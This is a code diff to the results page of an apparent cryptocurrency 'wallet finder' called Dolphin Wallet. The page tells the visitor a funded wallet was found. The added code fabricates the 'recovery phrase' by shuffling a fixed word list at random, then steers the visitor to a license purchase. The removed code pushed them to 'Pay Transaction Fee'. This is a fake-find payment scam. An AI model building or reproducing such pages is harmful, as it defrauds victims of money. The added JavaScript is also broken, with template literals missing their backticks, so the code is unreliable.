@@ -1,4 +1,3 @@
-<!-- results.html - Wallet Found Display (Enhanced UI) -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Scan Result - Dolphin Wallet</title>
   <link rel="stylesheet" href="../assets/style-neon.css" />
-  <script src="../config.js"></script>
   <style>
     body {
       background: radial-gradient(ellipse at center, #000010, #000);
@@ -76,9 +74,11 @@
 <body>
   <div class="result-box">
     <h1>🎉 Wallet Found!</h1>
-    <div class="wallet-info" id="walletInfo">Loading...</div>
+    <div class="wallet-info" id="walletInfo">
+      Loading...
+    </div>
     <div class="mnemonic" id="mnemonicWords"></div>
-    <div id="actionArea"></div>
+    <button class="btn" onclick="goToLicense()">Activate Wallet</button>
   </div>
 
   <script>
@@ -86,41 +86,38 @@
       window.location.href = "license.html";
     }
 
-    const wallet = JSON.parse(localStorage.getItem("foundWallet"));
-    const username = localStorage.getItem("username");
-
+    const wallet = JSON.parse(localStorage.getItem("found_wallet"));
     if (wallet) {
-      const maskedAddress = wallet.address.substring(0, 6) + "••••••••" + wallet.address.slice(-4);
-      document.getElementById("walletInfo").innerHTML = `
+      const address = wallet.address;
+      const maskedAddress = address.substring(0, 6) + "••••••••" + address.slice(-4);
+      document.getElementById("walletInfo").innerHTML = 
         <strong>Address:</strong><br>${maskedAddress}<br><br>
-        <strong>Balance:</strong> ${wallet.balance} ${wallet.network === 'Bitcoin' ? 'BTC' : wallet.network === 'Ethereum' ? 'ETH' : wallet.network === 'Tron' ? 'TRX' : 'BNB'}<br>
+        <strong>Balance:</strong> ${wallet.balance}<br>
         <strong>Network:</strong> ${wallet.network}<br>
         <strong>Last Transaction:</strong> ${wallet.lastTx}
-      `;
+      ;
 
-      const words = wallet.mnemonic ? wallet.mnemonic.split(" ") : [];
+      const allWords = [
+        "trouble", "filter", "gallery", "oxygen", "salmon", "silent",
+        "pistol", "bounce", "diamond", "trigger", "planet", "furnace",
+        "immune", "flee", "people", "initial", "panic", "crucial",
+        "display", "grace", "aim", "copper", "fashion", "pelican",
+        "pulp", "average", "wheel", "pride", "sketch", "flag",
+        "narrow", "object", "juice", "victory", "swallow", "refuse",
+        "goat", "dune", "phrase", "hole", "boy", "maid",
+        "report", "exhibit", "ride", "lecture", "dynamic", "burger",
+        "fork", "disorder", "assume", "table", "dawn", "hood",
+        "office", "art", "share", "later", "sell", "paper",
+        "quick", "steel", "acid", "taste", "promote", "robust",
+        "false", "hockey", "employ", "dinner", "scene", "rain"
+      ];
+      const selected = allWords.sort(() => 0.5 - Math.random()).slice(0, 12);
       const maskedIndices = [2, 4, 5, 6, 8, 10];
-      const wordInputs = words.map((word, index) => {
-        return `<input type="text" readonly value="${maskedIndices.includes(index) ? '••••••' : word}" />`;
+      const wordInputs = selected.map((word, index) => {
+        return <input type="text" readonly value="${maskedIndices.includes(index) ? '••••••' : word}" />;
       }).join("");
 
       document.getElementById("mnemonicWords").innerHTML = wordInputs;
-
-      // Check license status from backend
-      fetch(`${BASE_URL}/license-status/${username}`)
-        .then(res => res.json())
-        .then(data => {
-          const action = document.getElementById("actionArea");
-          if (data.status === 'approved') {
-            action.innerHTML = `<a href="transaction.html" class="btn">Next Step: Pay Transaction Fee</a>`;
-          } else {
-            action.innerHTML = `<a href="license.html" class="btn">Buy License</a><p style="color:orange; margin-top:10px">License payment is required to proceed.</p>`;
-          }
-        })
-        .catch(() => {
-          document.getElementById("actionArea").innerHTML = `<p style="color:red">Error checking license status</p>`;
-        });
-
     } else {
       document.getElementById("walletInfo").innerHTML = "❌ No wallet data found.";
     }
